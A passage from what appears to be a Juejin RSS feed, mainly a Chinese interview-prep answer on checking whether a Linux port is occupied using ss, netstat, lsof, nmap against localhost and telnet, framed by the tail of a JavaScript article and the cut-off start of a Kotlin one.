<p>addEventListener的第三个参数，从简单的布尔值进化为功能丰富的配置对象，背后是Web标准对开发效率与性能优化的不断追求。很多时候，我们并非不会用API，而是忽略了它的进阶能力。合理运用 <code>capture</code>、<code>once</code>、<code>passive</code>、<code>signal</code> 这些特性，能让我们的事件处理代码更简洁、性能更优异。下次绑定事件时，别再忽略这个"小而强大"的参数了！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[操作系统面试题 — Linux中如何查看某个端口有没有被占用？]]></title>    <link>https://juejin.cn/post/7575718948298047539</link>    <guid>https://juejin.cn/post/7575718948298047539</guid>    <pubDate>2025-11-24T02:58:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575718948298047539" data-draft-id="7575457788664250420" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="操作系统面试题 — Linux中如何查看某个端口有没有被占用？"/> <meta itemprop="keywords" content="后端,面试,Linux"/> <meta itemprop="datePublished" content="2025-11-24T02:58:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Cyan_RA9"/> <meta itemprop="url" content="https://juejin.cn/user/156585427741979"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            操作系统面试题 — Linux中如何查看某个端口有没有被占用？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/156585427741979/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Cyan_RA9
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:58:59.000Z" title="Mon Nov 24 2025 02:58:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>Author</strong> : Cyan_RA9<br/>
<strong>Source</strong> : 【<a href="https://link.juejin.cn?target=https%3A%2F%2Fnotes.kamacoder.com%2F" target="_blank" title="https://notes.kamacoder.com/" ref="nofollow noopener noreferrer">卡码笔记</a>】网站<br/>
<strong>Question</strong> : Linux中如何查看某个端口有没有被占用？</p>
</blockquote>
<h2 data-id="heading-0">【简要回答】</h2>
<ul>
<li>在Linux中，查看端口是否被占用的方法按场景可分为：
<ol>
<li><strong>快速检查端口是否被监听</strong>：<code>ss -tuln | grep :[端口号]</code> 或 <code>netstat -tuln | grep :[端口号]</code>。</li>
<li><strong>定位监听端口的进程</strong>：<code>sudo lsof -i :[端口号]</code>。</li>
<li><strong>全面查看端口所有连接状态及进程</strong>：<code>sudo ss -taunp | grep :[端口号]</code>。</li>
<li><strong>验证端口对外开放性</strong>：<code>nmap -sT -p [端口号] localhost</code> 或 <code>telnet localhost [端口号]</code>。</li>
</ol>
</li>
</ul>
<hr/>
<h2 data-id="heading-1">【详细回答】</h2>
<ol>
<li><strong>快速检查端口是否被监听</strong>：
<ul>
<li><strong>命令</strong>：<code>ss -tuln | grep :[端口号]</code> 或 <code>netstat -tuln | grep :[端口号]</code>。</li>
<li><strong>参数解析</strong>：<br/>
① <strong>-t</strong>：检查TCP协议端口。<br/>
② <strong>-u</strong>：检查UDP协议端口。<br/>
③ <strong>-l</strong>：<strong>仅</strong>显示监听状态（<strong>LISTEN</strong>）的端口。<br/>
④ <strong>-n</strong>：禁用域名解析，直接显示IP和端口号。</li>
<li><strong>适用场景</strong>：快速验证某个端口是否正在等待新的连接请求（即处于 LISTEN 状态）。这是启动服务前最常见的检查。</li>
</ul>
</li>
<li><strong>定位监听端口的进程</strong>：
<ul>
<li>
<p><strong>命令</strong>：<code>sudo lsof -i :[端口号]</code>。</p>
</li>
<li>
<p><strong>输出示例</strong>：</p>
<pre><code class="hljs language-sql" lang="sql">COMMAND  PID  <span class="hljs-keyword">USER</span>   FD   TYPE DEVICE SIZE<span class="hljs-operator">/</span>OFF NODE NAME  
nginx    <span class="hljs-number">1234</span> root    <span class="hljs-number">6</span>u  IPv4 <span class="hljs-number">123456</span>      <span class="hljs-number">0</span>t0  TCP <span class="hljs-operator">*</span>:<span class="hljs-number">80</span> (LISTEN)  
</code></pre>
</li>
<li>
<p><strong>关键信息</strong>：<br/>
① <strong>COMMAND</strong>：进程名称（如nginx）。<br/>
② <strong>PID</strong>：进程ID（如1234）。<br/>
③ <strong>USER</strong>：运行进程的用户（如root）。</p>
</li>
<li>
<p><strong>权限说明</strong>：普通用户可能无法查看所有进程，需使用 <strong>sudo</strong> 提权。</p>
</li>
<li>
<p><strong>适用场景</strong>：在确认端口处于监听状态后，精确找出是哪个进程正在使用该端口。lsof 是一个非常强大的工具，不仅能看网络连接，还能看文件句柄。</p>
</li>
</ul>
</li>
<li><strong>全面查看端口所有连接状态及进程</strong>：
<ul>
<li><strong>命令</strong>：<code>sudo ss -taunp | grep :[端口号]</code> 或 <code>sudo netstat -taunp | grep :[端口号]</code>。</li>
<li><strong>参数解析</strong>：<br/>
① <strong>-t</strong>：检查TCP协议端口。<br/>
② <strong>-u</strong>：检查UDP协议端口。<br/>
③ <strong>-a</strong>: 显示所有连接（包括监听、已建立、等待等各种状态）。<br/>
③ <strong>-n</strong>：禁用域名解析，直接显示IP和端口号。<br/>
④ <strong>-p</strong>: 显示使用端口的进程ID和名称。</li>
<li><strong>适用场景</strong>：需要了解某个端口当前所有连接状态（LISTEN、ESTABLISHED、TIME_WAIT、CLOSE_WAIT等）以及具体是哪个进程在使用它，进行更全面的分析。</li>
</ul>
</li>
<li><strong>验证端口对外开放性</strong>：
<ul>
<li><strong>命令</strong>：<code>nmap -sT -p [端口号] localhost</code> 或 <code>telnet localhost [端口号]</code>。</li>
<li><strong><code>namp</code>参数分解</strong>：<br/>
① <strong>-sT</strong>：TCP 全连接扫描（模拟正常连接行为，更可靠）；<br/>
② <strong>-p</strong>：指定扫描的端口号。</li>
<li><strong><code>namp</code>输出状态</strong>：<br/>
① <strong>open</strong>：端口开放且可访问；<br/>
② <strong>closed</strong>：端口未被占用；<br/>
③ <strong>filtered</strong>：端口被防火墙拦截。无法确定其状态。</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-2">【知识拓展】</h2>
<ol>
<li>
<p><strong>查看端口是否被占用的主要手段</strong>，如下图所示：
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59ed636cd4174b5b910019377fde8fbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ3lhbl9SQTk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557939&amp;x-signature=Il3GMndAm6pTdAS0SxLV%2FocRNKs%3D" alt="methods_detect_port.jpg" loading="lazy"/></p>
</li>
<li>
<p><strong>工具对比：ss vs netstat</strong>，如下表所示：</p>

























<table><thead><tr><th><strong>特性</strong></th><th><strong>ss</strong></th><th><strong>netstat</strong></th></tr></thead><tbody><tr><td><strong>数据来源</strong></td><td>直接读取内核socket表</td><td>解析<code>/proc/net</code>文件</td></tr><tr><td><strong>速度</strong></td><td>更快（适合高负载服务器）</td><td>较慢</td></tr><tr><td><strong>维护状态</strong></td><td>活跃维护（推荐使用）</td><td>已逐步淘汰</td></tr></tbody></table>
</li>
<li>
<p>端口状态解析（<code>ss</code>/<code>netstat</code>输出）:</p>
<ul>
<li><strong>LISTEN</strong>：端口正在监听，等待连接。</li>
<li><strong>ESTABLISHED</strong>：已建立活跃连接。</li>
<li><strong>TIME_WAIT</strong>：连接已关闭，等待内核清理（可能短暂占用端口）。</li>
<li><strong>CLOSE_WAIT</strong>：远程已关闭连接，本地未释放。</li>
</ul>
</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[7、保存界面状态]]></title>    <link>https://juejin.cn/post/7575425466905641023</link>    <guid>https://juejin.cn/post/7575425466905641023</guid>    <pubDate>2025-11-23T16:08:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575425466905641023" data-draft-id="7575468252656500777" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="7、保存界面状态"/> <meta itemprop="keywords" content="Kotlin"/> <meta itemprop="datePublished" content="2025-11-23T16:08:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="屠夫"/> <meta itemprop="url" content="https://juejin.cn/user/1533159252166510"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            7、保存界面状态
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1533159252166510/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    屠夫
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T16:08:13.000Z" title="Sun Nov 23 2025 16:08:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 